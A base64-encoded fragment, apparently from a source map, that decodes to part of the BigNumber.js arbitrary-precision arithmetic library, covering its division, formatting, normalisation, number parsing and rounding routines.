vbmNhdChwcm9kKTtcclxuXHJcbiAgICAgICAgICAgICAgLy8gU3VidHJhY3QgcHJvZHVjdCBmcm9tIHJlbWFpbmRlci5cclxuICAgICAgICAgICAgICBzdWJ0cmFjdChyZW0sIHByb2QsIHJlbUwsIGJhc2UpO1xyXG4gICAgICAgICAgICAgIHJlbUwgPSByZW0ubGVuZ3RoO1xyXG5cclxuICAgICAgICAgICAgICAgLy8gSWYgcHJvZHVjdCB3YXMgPCByZW1haW5kZXIuXHJcbiAgICAgICAgICAgICAgaWYgKGNtcCA9PSAtMSkge1xyXG5cclxuICAgICAgICAgICAgICAgIC8vIENvbXBhcmUgZGl2aXNvciBhbmQgbmV3IHJlbWFpbmRlci5cclxuICAgICAgICAgICAgICAgIC8vIElmIGRpdmlzb3IgPCBuZXcgcmVtYWluZGVyLCBzdWJ0cmFjdCBkaXZpc29yIGZyb20gcmVtYWluZGVyLlxyXG4gICAgICAgICAgICAgICAgLy8gVHJpYWwgZGlnaXQgbiB0b28gbG93LlxyXG4gICAgICAgICAgICAgICAgLy8gbiBpcyAxIHRvbyBsb3cgYWJvdXQgNSUgb2YgdGhlIHRpbWUsIGFuZCB2ZXJ5IHJhcmVseSAyIHRvbyBsb3cuXHJcbiAgICAgICAgICAgICAgICB3aGlsZSAoY29tcGFyZSh5YywgcmVtLCB5TCwgcmVtTCkgPCAxKSB7XHJcbiAgICAgICAgICAgICAgICAgIG4rKztcclxuXHJcbiAgICAgICAgICAgICAgICAgIC8vIFN1YnRyYWN0IGRpdmlzb3IgZnJvbSByZW1haW5kZXIuXHJcbiAgICAgICAgICAgICAgICAgIHN1YnRyYWN0KHJlbSwgeUwgPCByZW1MID8geXogOiB5YywgcmVtTCwgYmFzZSk7XHJcbiAgICAgICAgICAgICAgICAgIHJlbUwgPSByZW0ubGVuZ3RoO1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSBlbHNlIGlmIChjbXAgPT09IDApIHtcclxuICAgICAgICAgICAgICBuKys7XHJcbiAgICAgICAgICAgICAgcmVtID0gWzBdO1xyXG4gICAgICAgICAgICB9IC8vIGVsc2UgY21wID09PSAxIGFuZCBuIHdpbGwgYmUgMFxyXG5cclxuICAgICAgICAgICAgLy8gQWRkIHRoZSBuZXh0IGRpZ2l0LCBuLCB0byB0aGUgcmVzdWx0IGFycmF5LlxyXG4gICAgICAgICAgICBxY1tpKytdID0gbjtcclxuXHJcbiAgICAgICAgICAgIC8vIFVwZGF0ZSB0aGUgcmVtYWluZGVyLlxyXG4gICAgICAgICAgICBpZiAocmVtWzBdKSB7XHJcbiAgICAgICAgICAgICAgcmVtW3JlbUwrK10gPSB4Y1t4aV0gfHwgMDtcclxuICAgICAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgICByZW0gPSBbeGNbeGldXTtcclxuICAgICAgICAgICAgICByZW1MID0gMTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgICAgfSB3aGlsZSAoKHhpKysgPCB4TCB8fCByZW1bMF0gIT0gbnVsbCkgJiYgcy0tKTtcclxuXHJcbiAgICAgICAgICBtb3JlID0gcmVtWzBdICE9IG51bGw7XHJcblxyXG4gICAgICAgICAgLy8gTGVhZGluZyB6ZXJvP1xyXG4gICAgICAgICAgaWYgKCFxY1swXSkgcWMuc3BsaWNlKDAsIDEpO1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgaWYgKGJhc2UgPT0gQkFTRSkge1xyXG5cclxuICAgICAgICAgIC8vIFRvIGNhbGN1bGF0ZSBxLmUsIGZpcnN0IGdldCB0aGUgbnVtYmVyIG9mIGRpZ2l0cyBvZiBxY1swXS5cclxuICAgICAgICAgIGZvciAoaSA9IDEsIHMgPSBxY1swXTsgcyA+PSAxMDsgcyAvPSAxMCwgaSsrKTtcclxuXHJcbiAgICAgICAgICByb3VuZChxLCBkcCArIChxLmUgPSBpICsgZSAqIExPR19CQVNFIC0gMSkgKyAxLCBybSwgbW9yZSk7XHJcblxyXG4gICAgICAgIC8vIENhbGxlciBpcyBjb252ZXJ0QmFzZS5cclxuICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgcS5lID0gZTtcclxuICAgICAgICAgIHEuciA9ICttb3JlO1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgcmV0dXJuIHE7XHJcbiAgICAgIH07XHJcbiAgICB9KSgpO1xyXG5cclxuXHJcbiAgICAvKlxyXG4gICAgICogUmV0dXJuIGEgc3RyaW5nIHJlcHJlc2VudGluZyB0aGUgdmFsdWUgb2YgQmlnTnVtYmVyIG4gaW4gZml4ZWQtcG9pbnQgb3IgZXhwb25lbnRpYWxcclxuICAgICAqIG5vdGF0aW9uIHJvdW5kZWQgdG8gdGhlIHNwZWNpZmllZCBkZWNpbWFsIHBsYWNlcyBvciBzaWduaWZpY2FudCBkaWdpdHMuXHJcbiAgICAgKlxyXG4gICAgICogbjogYSBCaWdOdW1iZXIuXHJcbiAgICAgKiBpOiB0aGUgaW5kZXggb2YgdGhlIGxhc3QgZGlnaXQgcmVxdWlyZWQgKGkuZS4gdGhlIGRpZ2l0IHRoYXQgbWF5IGJlIHJvdW5kZWQgdXApLlxyXG4gICAgICogcm06IHRoZSByb3VuZGluZyBtb2RlLlxyXG4gICAgICogaWQ6IDEgKHRvRXhwb25lbnRpYWwpIG9yIDIgKHRvUHJlY2lzaW9uKS5cclxuICAgICAqL1xyXG4gICAgZnVuY3Rpb24gZm9ybWF0KG4sIGksIHJtLCBpZCkge1xyXG4gICAgICB2YXIgYzAsIGUsIG5lLCBsZW4sIHN0cjtcclxuXHJcbiAgICAgIGlmIChybSA9PSBudWxsKSBybSA9IFJPVU5ESU5HX01PREU7XHJcbiAgICAgIGVsc2UgaW50Q2hlY2socm0sIDAsIDgpO1xyXG5cclxuICAgICAgaWYgKCFuLmMpIHJldHVybiBuLnRvU3RyaW5nKCk7XHJcblxyXG4gICAgICBjMCA9IG4uY1swXTtcclxuICAgICAgbmUgPSBuLmU7XHJcblxyXG4gICAgICBpZiAoaSA9PSBudWxsKSB7XHJcbiAgICAgICAgc3RyID0gY29lZmZUb1N0cmluZyhuLmMpO1xyXG4gICAgICAgIHN0ciA9IGlkID09IDEgfHwgaWQgPT0gMiAmJiBuZSA8PSBUT19FWFBfTkVHXHJcbiAgICAgICAgID8gdG9FeHBvbmVudGlhbChzdHIsIG5lKVxyXG4gICAgICAgICA6IHRvRml4ZWRQb2ludChzdHIsIG5lLCAnMCcpO1xyXG4gICAgICB9IGVsc2Uge1xyXG4gICAgICAgIG4gPSByb3VuZChuZXcgQmlnTnVtYmVyKG4pLCBpLCBybSk7XHJcblxyXG4gICAgICAgIC8vIG4uZSBtYXkgaGF2ZSBjaGFuZ2VkIGlmIHRoZSB2YWx1ZSB3YXMgcm91bmRlZCB1cC5cclxuICAgICAgICBlID0gbi5lO1xyXG5cclxuICAgICAgICBzdHIgPSBjb2VmZlRvU3RyaW5nKG4uYyk7XHJcbiAgICAgICAgbGVuID0gc3RyLmxlbmd0aDtcclxuXHJcbiAgICAgICAgLy8gdG9QcmVjaXNpb24gcmV0dXJucyBleHBvbmVudGlhbCBub3RhdGlvbiBpZiB0aGUgbnVtYmVyIG9mIHNpZ25pZmljYW50IGRpZ2l0c1xyXG4gICAgICAgIC8vIHNwZWNpZmllZCBpcyBsZXNzIHRoYW4gdGhlIG51bWJlciBvZiBkaWdpdHMgbmVjZXNzYXJ5IHRvIHJlcHJlc2VudCB0aGUgaW50ZWdlclxyXG4gICAgICAgIC8vIHBhcnQgb2YgdGhlIHZhbHVlIGluIGZpeGVkLXBvaW50IG5vdGF0aW9uLlxyXG5cclxuICAgICAgICAvLyBFeHBvbmVudGlhbCBub3RhdGlvbi5cclxuICAgICAgICBpZiAoaWQgPT0gMSB8fCBpZCA9PSAyICYmIChpIDw9IGUgfHwgZSA8PSBUT19FWFBfTkVHKSkge1xyXG5cclxuICAgICAgICAgIC8vIEFwcGVuZCB6ZXJvcz9cclxuICAgICAgICAgIGZvciAoOyBsZW4gPCBpOyBzdHIgKz0gJzAnLCBsZW4rKyk7XHJcbiAgICAgICAgICBzdHIgPSB0b0V4cG9uZW50aWFsKHN0ciwgZSk7XHJcblxyXG4gICAgICAgIC8vIEZpeGVkLXBvaW50IG5vdGF0aW9uLlxyXG4gICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICBpIC09IG5lO1xyXG4gICAgICAgICAgc3RyID0gdG9GaXhlZFBvaW50KHN0ciwgZSwgJzAnKTtcclxuXHJcbiAgICAgICAgICAvLyBBcHBlbmQgemVyb3M/XHJcbiAgICAgICAgICBpZiAoZSArIDEgPiBsZW4pIHtcclxuICAgICAgICAgICAgaWYgKC0taSA+IDApIGZvciAoc3RyICs9ICcuJzsgaS0tOyBzdHIgKz0gJzAnKTtcclxuICAgICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICAgIGkgKz0gZSAtIGxlbjtcclxuICAgICAgICAgICAgaWYgKGkgPiAwKSB7XHJcbiAgICAgICAgICAgICAgaWYgKGUgKyAxID09IGxlbikgc3RyICs9ICcuJztcclxuICAgICAgICAgICAgICBmb3IgKDsgaS0tOyBzdHIgKz0gJzAnKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuICAgICAgfVxyXG5cclxuICAgICAgcmV0dXJuIG4ucyA8IDAgJiYgYzAgPyAnLScgKyBzdHIgOiBzdHI7XHJcbiAgICB9XHJcblxyXG5cclxuICAgIC8vIEhhbmRsZSBCaWdOdW1iZXIubWF4IGFuZCBCaWdOdW1iZXIubWluLlxyXG4gICAgZnVuY3Rpb24gbWF4T3JNaW4oYXJncywgbWV0aG9kKSB7XHJcbiAgICAgIHZhciBtLCBuLFxyXG4gICAgICAgIGkgPSAwO1xyXG5cclxuICAgICAgaWYgKGlzQXJyYXkoYXJnc1swXSkpIGFyZ3MgPSBhcmdzWzBdO1xyXG4gICAgICBtID0gbmV3IEJpZ051bWJlcihhcmdzWzBdKTtcclxuXHJcbiAgICAgIGZvciAoOyArK2kgPCBhcmdzLmxlbmd0aDspIHtcclxuICAgICAgICBuID0gbmV3IEJpZ051bWJlcihhcmdzW2ldKTtcclxuXHJcbiAgICAgICAgLy8gSWYgYW55IG51bWJlciBpcyBOYU4sIHJldHVybiBOYU4uXHJcbiAgICAgICAgaWYgKCFuLnMpIHtcclxuICAgICAgICAgIG0gPSBuO1xyXG4gICAgICAgICAgYnJlYWs7XHJcbiAgICAgICAgfSBlbHNlIGlmIChtZXRob2QuY2FsbChtLCBuKSkge1xyXG4gICAgICAgICAgbSA9IG47XHJcbiAgICAgICAgfVxyXG4gICAgICB9XHJcblxyXG4gICAgICByZXR1cm4gbTtcclxuICAgIH1cclxuXHJcblxyXG4gICAgLypcclxuICAgICAqIFN0cmlwIHRyYWlsaW5nIHplcm9zLCBjYWxjdWxhdGUgYmFzZSAxMCBleHBvbmVudCBhbmQgY2hlY2sgYWdhaW5zdCBNSU5fRVhQIGFuZCBNQVhfRVhQLlxyXG4gICAgICogQ2FsbGVkIGJ5IG1pbnVzLCBwbHVzIGFuZCB0aW1lcy5cclxuICAgICAqL1xyXG4gICAgZnVuY3Rpb24gbm9ybWFsaXNlKG4sIGMsIGUpIHtcclxuICAgICAgdmFyIGkgPSAxLFxyXG4gICAgICAgIGogPSBjLmxlbmd0aDtcclxuXHJcbiAgICAgICAvLyBSZW1vdmUgdHJhaWxpbmcgemVyb3MuXHJcbiAgICAgIGZvciAoOyAhY1stLWpdOyBjLnBvcCgpKTtcclxuXHJcbiAgICAgIC8vIENhbGN1bGF0ZSB0aGUgYmFzZSAxMCBleHBvbmVudC4gRmlyc3QgZ2V0IHRoZSBudW1iZXIgb2YgZGlnaXRzIG9mIGNbMF0uXHJcbiAgICAgIGZvciAoaiA9IGNbMF07IGogPj0gMTA7IGogLz0gMTAsIGkrKyk7XHJcblxyXG4gICAgICAvLyBPdmVyZmxvdz9cclxuICAgICAgaWYgKChlID0gaSArIGUgKiBMT0dfQkFTRSAtIDEpID4gTUFYX0VYUCkge1xyXG5cclxuICAgICAgICAvLyBJbmZpbml0eS5cclxuICAgICAgICBuLmMgPSBuLmUgPSBudWxsO1xyXG5cclxuICAgICAgLy8gVW5kZXJmbG93P1xyXG4gICAgICB9IGVsc2UgaWYgKGUgPCBNSU5fRVhQKSB7XHJcblxyXG4gICAgICAgIC8vIFplcm8uXHJcbiAgICAgICAgbi5jID0gW24uZSA9IDBdO1xyXG4gICAgICB9IGVsc2Uge1xyXG4gICAgICAgIG4uZSA9IGU7XHJcbiAgICAgICAgbi5jID0gYztcclxuICAgICAgfVxyXG5cclxuICAgICAgcmV0dXJuIG47XHJcbiAgICB9XHJcblxyXG5cclxuICAgIC8vIEhhbmRsZSB2YWx1ZXMgdGhhdCBmYWlsIHRoZSB2YWxpZGl0eSB0ZXN0IGluIEJpZ051bWJlci5cclxuICAgIHBhcnNlTnVtZXJpYyA9IChmdW5jdGlvbiAoKSB7XHJcbiAgICAgIHZhciBiYXNlUHJlZml4ID0gL14oLT8pMChbeGJvXSkoPz1cXHdbXFx3Ll0qJCkvaSxcclxuICAgICAgICBkb3RBZnRlciA9IC9eKFteLl0rKVxcLiQvLFxyXG4gICAgICAgIGRvdEJlZm9yZSA9IC9eXFwuKFteLl0rKSQvLFxyXG4gICAgICAgIGlzSW5maW5pdHlPck5hTiA9IC9eLT8oSW5maW5pdHl8TmFOKSQvLFxyXG4gICAgICAgIHdoaXRlc3BhY2VPclBsdXMgPSAvXlxccypcXCsoPz1bXFx3Ll0pfF5cXHMrfFxccyskL2c7XHJcblxyXG4gICAgICByZXR1cm4gZnVuY3Rpb24gKHgsIHN0ciwgaXNOdW0sIGIpIHtcclxuICAgICAgICB2YXIgYmFzZSxcclxuICAgICAgICAgIHMgPSBpc051bSA/IHN0ciA6IHN0ci5yZXBsYWNlKHdoaXRlc3BhY2VPclBsdXMsICcnKTtcclxuXHJcbiAgICAgICAgLy8gTm8gZXhjZXB0aW9uIG9uIOWNpEluZmluaXR5IG9yIE5hTi5cclxuICAgICAgICBpZiAoaXNJbmZpbml0eU9yTmFOLnRlc3QocykpIHtcclxuICAgICAgICAgIHgucyA9IGlzTmFOKHMpID8gbnVsbCA6IHMgPCAwID8gLTEgOiAxO1xyXG4gICAgICAgICAgeC5jID0geC5lID0gbnVsbDtcclxuICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgaWYgKCFpc051bSkge1xyXG5cclxuICAgICAgICAgICAgLy8gYmFzZVByZWZpeCA9IC9eKC0/KTAoW3hib10pKD89XFx3W1xcdy5dKiQpL2lcclxuICAgICAgICAgICAgcyA9IHMucmVwbGFjZShiYXNlUHJlZml4LCBmdW5jdGlvbiAobSwgcDEsIHAyKSB7XHJcbiAgICAgICAgICAgICAgYmFzZSA9IChwMiA9IHAyLnRvTG93ZXJDYXNlKCkpID09ICd4JyA/IDE2IDogcDIgPT0gJ2InID8gMiA6IDg7XHJcbiAgICAgICAgICAgICAgcmV0dXJuICFiIHx8IGIgPT0gYmFzZSA/IHAxIDogbTtcclxuICAgICAgICAgICAgfSk7XHJcblxyXG4gICAgICAgICAgICBpZiAoYikge1xyXG4gICAgICAgICAgICAgIGJhc2UgPSBiO1xyXG5cclxuICAgICAgICAgICAgICAvLyBFLmcuICcxLicgdG8gJzEnLCAnLjEnIHRvICcwLjEnXHJcbiAgICAgICAgICAgICAgcyA9IHMucmVwbGFjZShkb3RBZnRlciwgJyQxJykucmVwbGFjZShkb3RCZWZvcmUsICcwLiQxJyk7XHJcbiAgICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAgIGlmIChzdHIgIT0gcykgcmV0dXJuIG5ldyBCaWdOdW1iZXIocywgYmFzZSk7XHJcbiAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgLy8gJ1tCaWdOdW1iZXIgRXJyb3JdIE5vdCBhIG51bWJlcjoge259J1xyXG4gICAgICAgICAgLy8gJ1tCaWdOdW1iZXIgRXJyb3JdIE5vdCBhIGJhc2Uge2J9IG51bWJlcjoge259J1xyXG4gICAgICAgICAgaWYgKEJpZ051bWJlci5ERUJVRykge1xyXG4gICAgICAgICAgICB0aHJvdyBFcnJvclxyXG4gICAgICAgICAgICAgIChiaWdudW1iZXJFcnJvciArICdOb3QgYScgKyAoYiA/ICcgYmFzZSAnICsgYiA6ICcnKSArICcgbnVtYmVyOiAnICsgc3RyKTtcclxuICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAvLyBOYU5cclxuICAgICAgICAgIHguYyA9IHguZSA9IHgucyA9IG51bGw7XHJcbiAgICAgICAgfVxyXG4gICAgICB9XHJcbiAgICB9KSgpO1xyXG5cclxuXHJcbiAgICAvKlxyXG4gICAgICogUm91bmQgeCB0byBzZCBzaWduaWZpY2FudCBkaWdpdHMgdXNpbmcgcm91bmRpbmcgbW9kZSBybS4gQ2hlY2sgZm9yIG92ZXIvdW5kZXItZmxvdy5cclxuICAgICAqIElmIHIgaXMgdHJ1dGh5LCBpdCBpcyBrbm93biB0aGF0IHRoZXJlIGFyZSBtb3JlIGRpZ2l0cyBhZnRlciB0aGUgcm91bmRpbmcgZGlnaXQuXHJcbiAgICAgKi9cclxuICAgIGZ1bmN0aW9uIHJvdW5kKHgsIHNkLCBybSwgcikge1xyXG4gICAgICB2YXIgZCwgaSwgaiwgaywgbiwgbmksIHJkLFxyXG4gICAgICAgIHhjID0geC5jLFxyXG4gICAgICAgIHBvd3MxMCA9IFBPV1NfVEVOO1xyXG5cclxuICAgICAgLy8gaWYgeCBpcyBub3QgSW5maW5pdHkgb3IgTmFOLi4uXHJcbiAgICAgIGlmICh4Yykge1xyXG5cclxuICAgICAgICAvLyByZCBpcyB0aGUgcm91bmRpbmcgZGlnaXQsIGkuZS4gdGhlIGRpZ2l0IGFmdGVyIHRoZSBkaWdpdCB0aGF0IG1heSBiZSByb3VuZGVkIHVwLlxyXG4gICAgICAgIC8vIG4gaXMgYSBiYXNlIDFlMTQgbnVtYmVyLCB0aGUgdmFsdWUgb2YgdGhlIGVsZW1lbnQgb2YgYXJyYXkgeC5jIGNvbnRhaW5pbmcgcmQuXHJcbiAgICAgICAgLy8gbmkgaXMgdGhlIGluZGV4IG9mIG4gd2l0aGluIHguYy5cclxuICAgICAgICAvLyBkIGlzIHRoZSBudW1iZXIgb2YgZGlnaXRzIG9mIG4uXHJcbiAgICAgICAgLy8gaSBpcyB0aGUgaW5kZXggb2YgcmQgd2l0aGluIG4gaW5jbHVkaW5nIGxlYWRpbmcgemVyb3MuXHJcbiAgICAgICAgLy8gaiBpcyB0aGUgYWN0dWFsIGluZGV4IG9mIHJkIHdpdGhpbiBuIChpZiA8IDAsIHJkIGlzIGEgbGVhZGluZyB6ZXJvKS5cclxuICAgICAgICBvdXQ6IHtcclxuXHJcbiAgICAgICAgICAvLyBHZXQgdGhlIG51bWJlciBvZiBkaWdpdHMgb2YgdGhlIGZpcnN0IGVsZW1lbnQgb2YgeGMuXHJcbiAgICAgICAgICBmb3IgKGQgPSAxLCBrID0geGNbMF07IGsgPj0gMTA7IGsgLz0gMTAsIGQrKyk7XHJcbiAgICAgICAgICBpID0gc2QgLSBkO1xyXG5cclxuICAgICAgICAgIC8vIElmIHRoZSByb3VuZGluZyBkaWdpdCBpcyBpbiB0aGUgZmlyc3QgZWxlbWVudCBvZiB4Yy4uLlxyXG4gICAgICAgICAgaWYgKGkgPCAwKSB7XHJcbiAgICAgICAgICAgIGkgKz0gTE9HX0JBU0U7XHJcbiAgICAgICAgICAgIGogPSBzZDtcclxuICAgICAgICAgICAgbiA9IHhjW25pID0gMF07XHJcblxyXG4gICAgICAgICAgICAvLyBHZXQgdGhlIHJvdW5kaW5nIGRpZ2l0IGF0IGluZGV4IGogb2Ygbi5cclxuICAgICAgICAgICAgcmQgPSBuIC8gcG93czEwW2QgLSBqIC0gMV0gJSAxMCB8IDA7XHJcbiAgICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgICBuaSA9IG1hdGhjZWlsKChpICsgMSkgLyBMT0dfQkFTRSk7XHJcblxyXG4gICAgICAgICAgICBpZiAobmkgPj0geGMubGVuZ3RoKSB7XHJcblxyXG4gICAgICAgICAgICAgIGlmIChyKSB7XHJcblxyXG4gICAgICAgICAgICAgICAgLy8gTmVlZGVkIGJ5IHNxcnQuXHJcbiAgICAgICAgICAgICAgICBmb3IgKDsgeGMubGVuZ3RoIDw9IG5pOyB4Yy5wdXNoKDApKTtcclxuICAgICAgICAgICAgICAgIG4gPSByZCA9IDA7XHJcbiAgICAgICAgICAgICAgICBkID0gMTtcclxuICAgICAgICAgICAgICAgIGkgJT0gTE9HX0JBU0U7XHJcbiAgICAgICAgICAgICAgICBqID0gaSAtIExPR19CQVNFICsgMTtcclxuICAgICAgICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgICAgICAgYnJlYWsgb3V0O1xyXG4gICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgICBuID0gayA9IHhjW25pXTtcclxuXHJcbiAgICAgICAgICAgICAgLy8gR2V0IHRoZSBudW1iZXIgb2YgZGlnaXRzIG9mIG4uXHJcbiAgICAgICAgICAgICAgZm9yIChkID0gMTsgayA+PSAxMDsgayAvPSAxMCwgZCsrKTtcclxuXHJcbiAgICAgICAgICAgICAgLy8gR2V0IHRoZSBpbmRleCBvZiByZCB3aXRoaW4gbi5cclxuICAgICAgICAgICAgICBpICU9IExPR19CQVNFO1xyXG5cclxuICAgICAgICAgICAgICAvLyBHZXQgdGhlIGluZGV4IG9mIHJkIHdpdGhpbiBuLCBhZGp1c3RlZCBmb3IgbGVhZGluZyB6ZXJvcy5cclxuICAgICAgICAgICAgICAvLyBUaGUgbnVtYmVyIG9mIGxlYWRpbmcgemVyb3Mgb2YgbiBpcyBnaXZlbiBieSBMT0dfQkFTRSAtIGQuXHJcbiAgICAgICAgICAgICAgaiA9IGkgLSBMT0dfQkFTRSArIGQ7XHJcblxyXG4gICAgICAgICAgICAgIC8vIEdldCB0aGUgcm91bmRpbmcgZGlnaXQgYXQgaW5kZXggaiBvZiBuLlxyXG4gICAgICAgICAgICAgIHJkID0gaiA8IDAgPyAwIDogbiAvIHBvd3MxMFtkIC0gaiAtIDFdICUgMTAgfCAwO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgciA9IHIgfHwgc2QgPCAwIHx8XHJcblxyXG4gICAgICAgICAgLy8gQXJlIHRoZXJlIGFueSBub24temVybyBkaWdpdHMgYWZ0ZXIgdGhlIHJvdW5kaW5nIGRpZ2l0P1xyXG4gICAgICAgICAgLy8gVGhlIGV4cHJlc3Npb24gIG4gJSBwb3dzMTBbZCAtIGogLSAxXSAgcmV0dXJucyBhbGwgZGlnaXRzIG9mIG4gdG8gdGhlIHJpZ2h0XHJcbiAgICAgICAgICAvLyBvZiB0aGUgZGlnaXQgYXQgaiwgZS5nLiBpZiBuIGlzIDkwODcxNCBhbmQgaiBpcyAyLCB0aGUgZXhwcmVzc2lvbiBnaXZlcyA3MTQuXHJcbiAgICAgICAgICAgeGNbbmkgKyAxXSAhPSBudWxsIHx8IChqIDwgMCA/IG4gOiBuICUgcG93czEwW2QgLSBqIC0gMV0pO1xyXG5cclxuICAgICAgICAgIHIgPSBybSA8IDRcclxuICAgICAgICAgICA/IChyZCB8fCByKSAmJiAocm0gPT0gMCB8fCBybSA9PSAoeC5zIDwgMCA/IDMgOiAyKSlcclxuICAgICAgICAgICA6IHJkID4gNSB8fCByZCA9PSA1ICYmIChybSA9PSA0IHx8IHIgfHwgcm0gPT0gNiAmJlxyXG5cclxuICAgICAgICAgICAgLy8gQ2hlY2sgd2hldGhlciB0aGUgZGlnaXQgdG8gdGhlIGxlZnQgb2YgdGhlIHJvdW5kaW5nIGRpZ2l0IGlzIG9kZC5cclxuICAgICAgICAgICAgKChpID4gMCA/IGogPiAwID8gbiAvIHBvd3MxMFtkIC0gal0gOiAwIDogeGNbbmkgLSAxXSkgJSAxMCkgJiAxIHx8XHJcbiAgICAgICAgICAgICBybSA9PSAoeC5zIDwgMCA/IDggOiA3KSk7XHJcblxyXG4gICAgICAgICAgaWYgKHNkIDwgMSB8fCAheGNbMF0pIHtcclxuICAgICAgICAgICAgeGMubGVuZ3RoID0gMDtcclxuXHJcbiAgICAgICAgICAgIGlmIChyKSB7XHJcblxyXG4gICAgICAgICAgICAgIC8vIENvbnZlcnQgc2QgdG8gZGVjaW1hbCBwbGFjZXMuXHJcbiAgICAgICAgICAgICAgc2QgLT0geC5lICsgMTtcclxuXHJcbiAgICAgICAgICAgICAgLy8gMSwgMC4xLCAwLjAxLCAwLjAwMSwgMC4wMDAxIGV0Yy5cclxuICAgICAgICAgICAgICB4Y1swXSA9IHBvd3MxMFsoTE9HX0JBU0UgLSBzZCAlIExPR19CQVNFKSAlIExPR19CQVNFXTtcclxuICAgICAgICAgICAgICB4LmUgPSAtc2QgfHwgMDtcclxuICAgICAgICAgICAgfSBlbHNlIHtcclxuXHJcbiAgICAgICAgICAgICAgLy8gWmVyby5cclxuICAgICAgICAgICAgICB4Y1swXSA9IHguZSA9IDA7XHJcbiAgICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAgIHJldHVybiB4O1xyXG4gICAgICAgICAgfVxyXG5cclxuICAgICAgICAgIC8vIFJlbW92ZSBleGNlc3MgZGlnaXRzLlxyXG4gICAgICAgICAgaWYgKGkgPT0gMCkge1xyXG4gICAgICAgICAgICB4Yy5sZW5ndGggPSBuaTtcclxuICAgICAgICAgICAgayA9IDE7XHJcbiAgICAgICAgICAgIG5pLS07XHJcbiAgICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgICB4Yy5sZW5ndGggPSBuaSArIDE7XHJcbiAgICAgICAgICAgIGsgPSBwb3dzMTBbTE9HX0JBU0UgLSBpXTtcclxuXHJcbiAgICAgICAgICAgIC8vIEUuZy4gNTY3MDAgYmVjb21lcyA1NjAwMCBpZiA3IGlzIHRoZSByb3VuZGluZyBkaWdpdC5cclxuICAgICAgICAgICAgLy8gaiA+IDAgbWVhbnMgaSA+IG51bWJlciBvZiBsZWFkaW5nIHplcm9zIG9mIG4uXHJcbiAgICAgICAgICAgIHhjW25pXSA9IGogPiAwID8gbWF0aGZsb29yKG4gLyBwb3dzMTBbZCAtIGpdICUgcG93czEwW2pdKSAqIGsgOiAwO1xyXG4gICAgICAgICAgfVxyXG5cclxuICAgICAgICAgIC8vIFJvdW5kIHVwP1xyXG4gICAgICAgICAgaWYgKHIpIHtcclxuXHJcbiAgICAgICAgICAgIGZvciAoOyA7KSB7XHJcblxyXG4gICAgICAgICAgICAgIC8vIElmIHRoZSBkaWdpdCB0byBiZSByb3VuZGVkIHVwIGlzIGluIHRoZSBmaXJzdCBlbGVtZW50IG9mIHhjLi4uXHJcbiAgICAgICAgICAgICAgaWYgKG5pID09IDApIHtcclxuXHJcbiAgICAgICAgICAgICAgICAvLyBpIHdpbGwgYmUgdGhlIGxlbmd0aCBvZiB4Y1swXSBiZWZvcmUgayBpcyBhZGRlZC5cclxuICAgICAgICAgICAgICAgIGZvciAoaSA9IDEsIGogPSB4Y1swXTsgaiA+PSAxMDsgaiAvPSAxMCwgaSsrKTtcclxuICAgICAgICAgICAgICAgIGogPSB4Y1swXSArPSBrO1xyXG4gICAgICAgICAgICAgICAgZm9yIChrID0gMTsgaiA+PSAxMDsgaiAvPSAxMCwgaysrKTtcclxuXHJcbiAgICAgICAgICAgICAgICAvLyBpZiBpICE9IGsgdGhlIGxlbmd0aCBoYXMgaW5jcmVhc2VkLlxyXG4gICAgICAgICAgICAgICAgaWYgKGkgIT0gaykge1xyXG4gICAgICAgICAgICAgICAgICB4LmUrKztcclxuICAgICAgICAgICAgICAgICAgaWYgKHhjWzBdID09IEJBU0UpIHhjWzBdID0gMTtcclxuICAgICAgICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAgICAgICBicmVhaztcclxuICAgICAgICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgICAgICAgeGNbbmldICs9IGs7XHJcbiAgICAgICAgICAgICAgICBpZiAoeGNbbmldICE9IEJBU0UpIGJyZWFrO1xyXG4gICAgICAgICAgICAgICAgeGNbbmktLV0gPSAwO1xyXG4gICAgICAgICAgICAgICAgayA9IDE7XHJcbiAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgLy8gUmVtb3ZlIHRyYWlsaW5nIHplcm9zLlxyXG4gICAgICAgICAgZm9yIChpID0geGMubGVuZ3RoOyB4Y1stLWldID09PSAwOyB4Yy5wb3AoKSk7XHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICAvLyBPdmVyZmxvdz8gSW5maW5pdHkuXHJcbiAgICAgICAgaWYgKHguZSA+IE1BWF9FWFApIHtcclxuICAgICAgICAgIHguYyA9IHguZSA9IG51bGw7XHJcblxyXG4gICAgICAgIC8vIFVuZGVyZmxvdz8gWmVyby5cclxuICAgICAgICB9IGVsc2UgaWYgKHguZSA8IE1JTl9FWFApIHtcclxuICAgICAgICAgIHguYyA9IFt4LmUgPSAwXTtcclxuICAgICAgICB9XHJcbiAgICAgIH1cclxuXHJcbiAgICAgIHJldHVybiB4O1xyXG4gICAgfVxyXG5cclxuXHJcbiAgICAvLyBQUk9UT1RZUEUvSU5TVEFOQ0UgTUVUSE9EU1xyXG5cclxuXHJcbiAgICAvKlxyXG4gICAgICogUmV0d